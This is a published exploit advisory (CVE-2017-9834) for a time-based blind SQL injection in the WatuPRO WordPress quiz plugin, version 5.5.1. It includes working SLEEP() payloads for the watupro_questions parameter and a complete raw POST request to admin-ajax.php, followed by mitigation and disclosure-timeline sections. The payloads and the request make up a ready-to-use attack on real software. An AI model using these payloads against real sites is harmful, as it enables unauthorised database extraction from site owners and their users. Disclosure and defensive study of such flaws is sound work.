@@ -1,0 +1,59 @@
+#####################################
+Exploit Title: SQL Injection In WatuPRO (WordPress Plugin to Create Exams, Tests and Quizzes)
+Exploit Author: Manich  Koomsusi
+Date: 03-07-2017
+Software: WatuPRO
+Version: 5.5.1
+Website: http://calendarscripts.info/watupro/
+Tested on: WordPress 4.7.5
+Software Link: https://1drv.ms/u/s!AhfkvGaDTn1bmgHSj9u_jQX8iME0
+CVE: CVE-2017-9834
+#####################################
+
+Description
+==================================
+SQL Injection in WatuPRO WordPress Plugin for create exams, Tests and Quizzes allow the attacker dump the database contents.
+
+Vulnerability
+==================================
+This plugin sending quizzes to the server with “watupro_questions” parameter not sanitize before take SQL statement.
+
+Proof of concept
+==================================
+Take exams or quizzes and submit to the server in POST method
+
+Payload : “1:1,2) AND 4761=IF((41=41),SLEEP(5),4761) AND (4547=4547”    the server delay response time around ~5 second.
+Payload : “1:1,2) AND 4761=IF((41=41),SLEEP(0),4761) AND (4547=4547”    the server not delay response time.
+
+############
+POST /pt/wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Content-Length: 292
+Accept-Language: en-US,en;q=0.5
+Host: 192.168.5.189
+Accept: text/plain, */*; q=0.01
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+DNT: 1
+Connection: close
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.5.189/pt/wordpress/
+Cookie: wordpress_155e4542aeb2c66021dab6903e684bdb=admin%7C1497811093%7CaY85tN6gH7x8iYCzPETIcEJYYyn6tZlzJnbhTZLgZYX%7C475cf68a551a0db99cd991e958fc949bfe8f2a833bf39d0534ce25d29c11a9b8; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_155e4542aeb2c66021dab6903e684bdb=admin%7C1497811093%7CaY85tN6gH7x8iYCzPETIcEJYYyn6tZlzJnbhTZLgZYX%7C61ef1ea8c998118da9dd01d5f650dc0806f8bfbb1d5f28fdbb626f062bcebbcd; wp-settings-time-1=1497748191; PHPSESSID=rh7v9qt9ibdlioth3cecr5gg94
+Content-Type: application/x-www-form-urlencoded
+action=watupro_submit&quiz_id=1&question_id%5B%5D=1&watupro_questions=1:1,2)%20AND%204761%3dIF((41%3d41),SLEEP(5),4761)%20AND%20(4547%3d4547&post_id=5&answer-1%5B%5D=1&question_1_hints=&taker_email=hacker%40admin.com<http://40admin.com>&h_app_id=0.24749700+1497748201&start_time=2017-06-18+01%3A10%3A01&in_ajax=1
+#############
+
+
+Mitigations
+==================================
+Upgrade to version 5.5.3.7 or later.
+
+Timeline
+==================================
+2017-06-19: Discovered the bug
+2017-06-19: Reported to vendor
+2017-06-19: First response from vendor saying software it fixed. But the vendor fix not properly
+2017-06-20: Version 5.5.3.7 released “Fixed issue with input validate.”
+2017-07-03: Advisory published
+
+Discovered By:
+=====================
+Manich  Koomsusi
